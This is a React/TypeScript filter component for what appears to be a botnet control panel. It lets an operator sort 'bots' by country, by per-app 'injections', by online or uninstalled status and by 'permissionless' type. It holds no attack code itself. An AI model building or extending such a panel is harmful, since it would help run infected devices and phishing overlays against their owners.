import React from "react";
import {Col, Input, Row, Select, Space, Tag} from "antd";
import {SearchOutlined} from "@ant-design/icons";
import {changeBotsFilter} from "../../../Store/Bots/Actions";
import {DeadIcon, OfflineIcon, OnlineIcon} from "../../Misc/CustomIcons";
import {AppState} from "../../../Store/RootReducer";
import {InjectionFilter} from "../../../Store/Filters/Types";
import {getBackendUrl} from "../../../Util/config";
import {useTranslation} from "react-i18next";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";

const {Option} = Select;
const {Search} = Input;

const BotsFilter: React.FC = () => {
    const dispatch = useAppDispatch();
    const filters = useAppSelector((state: AppState) => state.filters);
    const botReducer = useAppSelector((state: AppState) => state.bots);
    const {t} = useTranslation();

    const injectionsFilterChange = (injections: string[]) => {
        dispatch(changeBotsFilter({
            injections: injections,
        }));
    };

    const countriesFilterChange = (countryCodes: string[]) => {
        dispatch(changeBotsFilter({
            countries: countryCodes,
        }));
    };

    const statusesFilterChange = (statuses: string[]) => {
        dispatch(changeBotsFilter({
            statuses: statuses,
        }));
    };

    const tagsFilterChange = (tags: string[]) => {
        dispatch(changeBotsFilter({
            tags: tags,
        }));
    };

    const typesFilterChange = (types: string[]) => {
        dispatch(changeBotsFilter({
            types: types,
        }));
    };

    const authReducer = useAppSelector((state: AppState) => state.auth);

    // TODO разбить на подкомпоненты
    return (
        <Row gutter={15} style={{width: 300}}>
            <Col span={24} style={{marginBottom: 15}}>
                <Select
                    mode="multiple"
                    placeholder={t("COUNTRY")}
                    optionLabelProp="label"
                    className="panel-select"
                    allowClear
                    onChange={countriesFilterChange}
                    value={botReducer.filters.countries}
                    loading={!filters.isLoaded}

                >
                    {Object.keys(filters.countries).map((countryCode: string, key: number) => {
                        const countryName = filters.countries[countryCode];
                        return (
                            <Option value={countryCode} key={key}
                                label={
                                    <>
                                        <img
                                            src={`https://purecatamphetamine.github.io/country-flag-icons/3x2/${countryCode.toUpperCase()}.svg`}
                                            width={16}
                                            alt={countryName}
                                        /> {countryName}
                                    </>
                                }>
                                <div className="option-label">
                                    <span role="img" aria-label={countryName}>
                                        <img
                                            src={`https://purecatamphetamine.github.io/country-flag-icons/3x2/${countryCode.toUpperCase()}.svg`}
                                            alt={countryName}
                                            width={16}
                                        />
                                    </span> {countryName}
                                </div>
                            </Option>
                        );
                    })}
                </Select>
            </Col>
            <Col span={24} style={{marginBottom: 15}}>
                <Select
                    mode="multiple"
                    placeholder={t("INJECTIONS")}
                    optionLabelProp="label"
                    className="panel-select"
                    onChange={injectionsFilterChange}
                    value={botReducer.filters.injections}
                    allowClear
                    loading={!filters.isLoaded}

                >
                    {Object.keys(filters.injections).map((application: string, key: number) => {
                        const injection: InjectionFilter = filters.injections[application];
                        return (
                            <Option key={key} value={application}
                                label={
                                    <>
                                        <img
                                            src={getBackendUrl(`injects/images/${injection.type}/${application}.png`)}
                                            width={16}
                                            alt={injection.name}
                                        /> {injection.name}
                                    </>
                                }
                            >
                                <div className="option-label">
                                    <span role="img" aria-label={injection.name}>
                                        <img
                                            src={getBackendUrl(`injects/images/${injection.type}/${application}.png`)}
                                            alt={injection.name}
                                            width={16}
                                        />
                                    </span> {injection.name}
                                </div>
                            </Option>
                        );
                    })}
                </Select>
            </Col>
            <Col span={24} style={{marginBottom: 15}}>
                <Select
                    mode="multiple"
                    optionLabelProp="label"
                    className="panel-select"
                    placeholder={t("STATUS")}
                    onChange={statusesFilterChange}
                    value={botReducer.filters.statuses}
                    allowClear
                    loading={!botReducer.isLoaded}

                >
                    <Option value="online"
                        label={
                            <>
                                <OnlineIcon/> Online
                            </>
                        }>
                        <div className="option-label">
                            <OnlineIcon/> Online
                        </div>
                    </Option>
                    <Option value="offline"
                        label={
                            <>
                                <OfflineIcon/> Offline
                            </>
                        }>
                        <div className="option-label">
                            <OfflineIcon/> Offline
                        </div>
                    </Option>
                    <Option value="dead"
                        label={
                            <>
                                <DeadIcon/> Uninstalled
                            </>
                        }>
                        <div className="option-label">
                            <DeadIcon/> Uninstalled
                        </div>
                    </Option>
                </Select>
            </Col>
            <Col span={24} style={{marginBottom: 15}}>
                <Select
                    mode="multiple"
                    optionLabelProp="label"
                    className="panel-select select-tags"
                    placeholder={t("TAGS")}
                    onChange={tagsFilterChange}
                    value={
                        botReducer.filters.tags.length !== authReducer.user.tags.length &&
                        botReducer.filters.tags.length !== 0 ?
                            botReducer.filters.tags :
                            authReducer.user.tags
                    }
                    allowClear
                    loading={!authReducer.isLoaded}
                    maxTagCount={2}

                >
                    {authReducer.user.tags.map((tag, id) => (
                        <Option value={tag} label={tag} key={id}>
                            <Tag color="#177ddc">
                                {tag}
                            </Tag>
                        </Option>
                    ))}
                </Select>
            </Col>
            <Col span={24} style={{marginBottom: 15}}>
                <Select
                    mode="multiple"
                    optionLabelProp="label"
                    className="panel-select"
                    placeholder={t("TYPES")}
                    onChange={typesFilterChange}
                    value={botReducer.filters.types}
                    allowClear
                    loading={!botReducer.isLoaded}

                >
                    <Option value="favorite"
                        label={
                            <Space>
                                <span className="anticon">
                                    <i className="fa-solid fa-heart filter-favorite active" />
                                </span>
                                <span>{t("FAVOURITE")}</span>
                            </Space>
                        }
                    >
                        <div className="option-label">
                            <Space>
                                <span className="anticon">
                                    <i className="fa-solid fa-heart filter-favorite active" />
                                </span>
                                <span>{t("FAVOURITE")}</span>
                            </Space>
                        </div>
                    </Option>
                    <Option value="permissionless"
                        label={
                            <Space>
                                <span className="anticon">
                                    <i className="fa-solid fa-universal-access filter-permissionless" />
                                </span>
                                <span>{t("PERMISSIONLESS")}</span>
                            </Space>
                        }
                    >
                        <div className="option-label">
                            <Space>
                                <span className="anticon">
                                    <i className="fa-solid fa-universal-access filter-permissionless" />
                                </span>
                                <span>{t("PERMISSIONLESS")}</span>
                            </Space>
                        </div>
                    </Option>
                </Select>
            </Col>
            <Col span={24}>
                <Search
                    name={"searchQuery"}
                    defaultValue={botReducer.filters.query}
                    className="panel-select"
                    enterButton={(
                        <>
                            <SearchOutlined/> {t("SEARCH")}
                        </>
                    )}
                    placeholder={t("SEARCH")}
                    onSearch={(searchQuery: string) => {
                        dispatch(changeBotsFilter({
                            query: searchQuery,
                        }));
                    }}
                    loading={!botReducer.isLoaded}

                />
            </Col>
        </Row>
    );
};

export default BotsFilter;
